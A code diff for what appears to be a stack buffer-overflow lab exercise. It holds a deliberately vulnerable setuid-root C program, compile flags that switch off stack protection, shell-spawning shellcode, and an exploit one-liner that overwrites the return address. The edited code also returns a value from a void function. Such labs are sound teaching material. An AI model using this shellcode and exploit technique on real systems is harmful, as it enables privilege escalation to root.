@@ -9,11 +9,11 @@
 // COMPILE $ gcc -z execstack -fno-stack-protector bof6.c -o bof6
 // SETUID  $ sudo chown root:root bof6
 //         $ sudo chmod 4755 bof6
-// EXPLOIT $ (py3 -c "print('a'*136+'\x10\x50\x75\x55\x55\x55\x00\x00')";cat) | ./bof6
+// EXPLOIT $ (python -c "print('a'*136+'\x10\x50\x75\x55\x55\x55\x00\x00')";cat) | ./bof6
 
 char code[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
 
-int main() {
+void vuln() {
     char buf[BUF_SIZE];
 
     printf("[shellcode:%p]\n", code);
@@ -24,5 +24,9 @@ int main() {
         perror("setuid");
         return 1;
     }
+}
+
+int main() {
+    vuln();
     return 0;
 }
